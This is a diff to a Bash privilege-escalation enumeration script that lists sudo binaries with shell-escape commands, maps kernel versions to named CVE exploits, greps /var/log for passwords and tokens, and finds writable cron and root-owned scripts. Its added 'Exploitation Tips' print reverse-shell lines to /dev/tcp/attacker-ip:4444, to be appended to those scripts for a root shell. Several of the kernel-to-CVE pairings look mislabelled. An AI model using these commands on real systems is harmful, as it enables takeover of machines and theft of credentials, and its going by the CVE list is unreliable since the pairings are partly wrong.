@@ -30,7 +30,6 @@ if [[ -z "$SUDO_CMDS" ]]; then
 else
     echo "$SUDO_CMDS" | tee -a "$LOG_FILE"
 
-    # 🔥 Expanded list of exploitable sudo binaries
     declare -A SUDO_EXPLOITS=(
         ["find"]="sudo find . -exec /bin/sh \\; -quit"
         ["vim"]="sudo vim -c ':!/bin/sh'"
@@ -57,12 +56,43 @@ fi
 # ------------------- KERNEL EXPLOIT SUGGESTIONS -------------------
 
 echo -e "\n[+] Checking for Known Kernel Exploits Based on Version:" | tee -a "$LOG_FILE"
-case "$KERNEL_VERSION" in
-    *"5.4.0"*)
-        echo "[!] Possible Kernel Exploit: Use-After-Free in io_uring (CVE-2021-3493)" | tee -a "$LOG_FILE"
-        echo -e "[!] Exploitation Tip:\n- Download and compile an exploit:\n  gcc exploit.c -o exploit\n  ./exploit\n  -> If successful, this grants root access.\n" | tee -a "$LOG_FILE"
-        ;;
-esac
+
+declare -A KERNEL_EXPLOITS=(
+    ["2.6.32"]="DirtyCow (CVE-2016-5195)"
+    ["3.13"]="OverlayFS (CVE-2015-1328)"
+    ["4.4"]="DirtyCow Variant (CVE-2016-5195)"
+    ["4.10"]="Privilege Escalation via AF_PACKET (CVE-2017-7308)"
+    ["4.15"]="Systemd Privilege Escalation (CVE-2018-15688)"
+    ["4.18"]="Ubuntu OverlayFS Exploit (CVE-2018-14634)"
+    ["5.3"]="OverlayFS Exploit (CVE-2019-13272)"
+    ["5.4"]="Use-After-Free in io_uring (CVE-2021-3493)"
+    ["5.8"]="OverlayFS (CVE-2021-3493)"
+    ["5.10"]="Privilege Escalation in netfilter (CVE-2022-25636)"
+)
+
+for KERNEL in "${!KERNEL_EXPLOITS[@]}"; do
+    if [[ "$KERNEL_VERSION" == *"$KERNEL"* ]]; then
+        echo "[!] Possible Kernel Exploit: ${KERNEL_EXPLOITS[$KERNEL]}" | tee -a "$LOG_FILE"
+        echo -e "[!] Exploitation Tip:\n- Search for a public exploit:\n  Search ExploitDB for ${KERNEL_EXPLOITS[$KERNEL]}\n  Compile & execute.\n" | tee -a "$LOG_FILE"
+    fi
+done
+
+# ------------------- CRON JOB EXPLOIT CHECK -------------------
+
+echo -e "\n[+] Checking for Scheduled Cron Jobs:" | tee -a "$LOG_FILE"
+CRON_JOBS=$(crontab -l 2>/dev/null; cat /etc/crontab /etc/cron.d/* 2>/dev/null)
+if [[ -n "$CRON_JOBS" ]]; then
+    echo "$CRON_JOBS" | tee -a "$LOG_FILE"
+
+    echo -e "\n[+] Checking for Writable Cron Scripts:" | tee -a "$LOG_FILE"
+    WRITABLE_CRON_SCRIPTS=$(find /etc/cron* -type f -writable 2>/dev/null)
+    if [[ -n "$WRITABLE_CRON_SCRIPTS" ]]; then
+        echo "$WRITABLE_CRON_SCRIPTS" | tee -a "$LOG_FILE"
+        echo -e "[!] Exploitation Tip:\n- A writable cron script can be modified to execute a reverse shell.\n- Example:\n  echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1' >> /etc/cron.hourly/backup.sh\n  chmod +x /etc/cron.hourly/backup.sh\n  -> When the cron job runs, you get a root shell.\n" | tee -a "$LOG_FILE"
+    fi
+else
+    echo "[-] No cron jobs found." | tee -a "$LOG_FILE"
+fi
 
 # ------------------- LATERAL MOVEMENT CHECKS -------------------
 
@@ -86,7 +116,7 @@ echo -e "\n[+] Checking logs for sensitive information (passwords, tokens, API k
 CRED_LOGS=$(grep -rniE "password|passwd|token|apikey|secret" /var/log 2>/dev/null)
 if [[ -n "$CRED_LOGS" ]]; then
     echo "$CRED_LOGS" | tee -a "$LOG_FILE"
-    echo -e "[!] Exploitation Tip:\n- Use leaked passwords or API keys for access:\n  ssh dev@target-machine\n  curl -H \"Authorization: Bearer <API_KEY>\" https://api.target.com\n" | tee -a "$LOG_FILE"
+    echo -e "[!] Exploitation Tip:\n- Use leaked passwords or API keys for access.\n" | tee -a "$LOG_FILE"
 fi
 
 # ------------------- PRIVILEGE ESCALATION VIA FILE PERMISSIONS -------------------
@@ -103,7 +133,7 @@ echo -e "\n[+] Searching for writable root-owned scripts:" | tee -a "$LOG_FILE"
 WRITABLE_SCRIPTS=$(find /usr/local/bin /usr/bin /bin /sbin -type f -perm -002 -user root 2>/dev/null)
 if [[ -n "$WRITABLE_SCRIPTS" ]]; then
     echo "$WRITABLE_SCRIPTS" | tee -a "$LOG_FILE"
-    echo -e "[!] Exploitation Tip:\n- Modify a root-owned script to execute malicious commands:\n  echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1' >> /usr/local/bin/backup.sh\n" | tee -a "$LOG_FILE"
+    echo -e "[!] Exploitation Tip:\n- If a root-owned script is writable, modify it to execute a root shell.\n- Example: Add a reverse shell command to the script:\n  echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1' >> /usr/local/bin/backup.sh\n  chmod +x /usr/local/bin/backup.sh\n  -> When root runs the script, you get a shell.\n" | tee -a "$LOG_FILE"
 fi
 
 # ------------------- ENUMERATION COMPLETED -------------------
